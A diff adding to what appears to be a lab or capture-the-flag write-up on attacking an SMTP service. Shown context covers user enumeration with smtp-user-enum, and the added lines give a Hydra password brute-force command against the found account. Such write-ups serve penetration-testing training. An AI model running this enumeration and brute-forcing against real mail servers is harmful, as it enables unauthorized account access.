@@ -474,3 +474,10 @@ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.81.81
 I got one valid user: **fiona@inlanefreight.htb**
 
 [![Screenshot-2025-02-27-141532.png](https://i.postimg.cc/xTBTyBQN/Screenshot-2025-02-27-141532.png)](https://postimg.cc/rKCkqnKq)
+
+I attempted a brute-force attack on the SMTP service using Hydra with the following command:
+
+```bash
+hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -t 64 -f 10.129.81.81 smtp
+```
+
